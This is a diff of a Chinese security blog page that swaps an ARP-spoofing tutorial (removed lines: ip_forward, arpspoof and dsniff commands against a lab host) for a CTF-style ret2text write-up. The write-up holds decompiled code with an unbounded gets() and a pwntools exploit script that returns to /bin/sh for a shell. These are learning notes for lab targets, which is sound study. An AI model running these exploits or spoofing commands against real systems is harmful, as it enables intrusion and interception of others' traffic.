@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>ARP欺骗原理及实例 · yemoli&#39;s blog</title>
+    <title>pwn学习笔记-ret2text · yemoli&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">yemoli&#39;s blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">ARP欺骗原理及实例</a>
+                <a href="#" class="post-name">pwn学习笔记-ret2text</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            ARP欺骗原理及实例
+            pwn学习笔记-ret2text
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="系统总结">系统总结</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">365</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">230</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/01/19</span>
+                    <span class="post-intro-time">2019/01/21</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,31 +401,52 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="arp协议简介"><a href="#arp协议简介" class="headerlink" title="arp协议简介"></a>arp协议简介</h2><p>arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的</p>
-<h2 id="arp欺骗原理"><a href="#arp欺骗原理" class="headerlink" title="arp欺骗原理"></a>arp欺骗原理</h2><p>每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回包中的ip和Mac地址对应的关系添加到arp缓存表中。</p>
-<h2 id="实例复现"><a href="#实例复现" class="headerlink" title="实例复现"></a>实例复现</h2><p>这里使用一台winxp和kali虚拟机</p>
-<p>ip分别是192.168.18.131,192.168.18.135</p>
-<p><img src="https://i.imgur.com/NcOuF1y.jpg" alt=""></p>
-<p><img src="https://i.imgur.com/YMwTJXr.jpg" alt=""></p>
-<p>这里我们为的是侦测到目标机的某些网络活动，所以在开始欺骗之前需要开启ip转发，不然在操作时目标主机会出现断网的情况</p>
-<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
-</code></pre><p>kali下arp攻击工具是arpspoof，具体的命令可在百度上查询到或者使用arpspoof -h 查看口令</p>
-<p><img src="https://i.imgur.com/Es74AWJ.jpg" alt=""></p>
-<p>arpspoof -i eth0 -t 192.168.18.131 192.168.18.135</p>
-<p>开始修改目标机上的缓存表</p>
-<p><img src="https://i.imgur.com/6lZ2OKf.jpg" alt=""></p>
-<p>开始嗅探目标机上的网络活动</p>
-<p>dsniff -i eth0</p>
-<p>这就完成了一次arp欺骗攻击，我们就可以捕捉到目标机的网络活动了</p>
+        <p>查看程序基本信息</p>
+<p><img src="https://i.imgur.com/2DByZ78.jpg" alt=""></p>
+<p>开启了NX，代表着栈上的数据是不可执行的</p>
+<p>运行程序看一下</p>
+<p><img src="https://i.imgur.com/ZdwMaiJ.jpg" alt=""></p>
+<p>程序只有一个输入点，下面将程序拖入ida</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-64h]
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts(&quot;There is something amazing here, do you know anything?&quot;);
+  gets(&amp;s);
+  printf(&quot;Maybe I will tell you next time !&quot;);
+  return 0;
+}
+</code></pre><p>看到了无输入限制的gets函数，我们接下来计算一下程序gets函数的返回地址</p>
+<p><img src="https://i.imgur.com/FiJp9SP.jpg" alt=""></p>
+<p>可以看到地址是0x62616164，下面计算我们需要填充的字节数</p>
+<p><img src="https://i.imgur.com/erWFcpD.jpg" alt=""></p>
+<p>需要填充112个无用字符</p>
+<p>接下来我们在ida中查看是否存在/bin/sh</p>
+<p><img src="https://i.imgur.com/oCx4Cy3.jpg" alt=""></p>
+<p>在地址0x0804863A处存在/bin/sh</p>
+<p>接下来编写shell脚本</p>
+<pre><code>from pwn import *
+
+p = process(&quot;./ret2text&quot;)
+
+p.recvuntil(&apos;anything?\n&apos;)
+
+p.sendline(&apos;a&apos;*112+p32(0x0804863A))
+
+p.interactive()
+</code></pre><p><img src="https://i.imgur.com/ZmJ3Be9.jpg" alt=""></p>
+<p>成功获得权限</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://yml-sec.top">夜莫离、</a>
-            </p><p>原文链接：<a href="https://yml-sec.top/2019/01/19/ARP欺骗原理及实例/">https://yml-sec.top/2019/01/19/ARP欺骗原理及实例/</a>
-            </p><p>发表日期：<a href="https://yml-sec.top/2019/01/19/ARP欺骗原理及实例/">January 19th 2019, 5:11:37 pm</a>
-            </p><p>更新日期：<a href="https://yml-sec.top/2019/01/19/ARP欺骗原理及实例/">January 19th 2019, 6:14:02 pm</a>
+            </p><p>原文链接：<a href="https://yml-sec.top/2019/01/21/pwn学习笔记-ret2text/">https://yml-sec.top/2019/01/21/pwn学习笔记-ret2text/</a>
+            </p><p>发表日期：<a href="https://yml-sec.top/2019/01/21/pwn学习笔记-ret2text/">January 21st 2019, 6:57:29 pm</a>
+            </p><p>更新日期：<a href="https://yml-sec.top/2019/01/21/pwn学习笔记-ret2text/">January 21st 2019, 7:11:14 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -433,17 +454,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/01/20/flask-debug模式下pin码安全/" title="flask debug模式下pin码安全">
-                    <div class="nextTitle">flask debug模式下pin码安全</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/01/18/无数字和字母的webshell/" title="无数字和字母的webshell">
-                    <div class="prevTitle">无数字和字母的webshell</div>
+                <a href="/2019/01/20/flask-debug模式下pin码安全/" title="flask debug模式下pin码安全">
+                    <div class="prevTitle">flask debug模式下pin码安全</div>
                 </a>
             
         </li>
@@ -562,7 +578,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#arp协议简介"><span class="toc-number">1.</span> <span class="toc-text">arp协议简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#arp欺骗原理"><span class="toc-number">2.</span> <span class="toc-text">arp欺骗原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例复现"><span class="toc-number">3.</span> <span class="toc-text">实例复现</span></a></li></ol>
+        
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
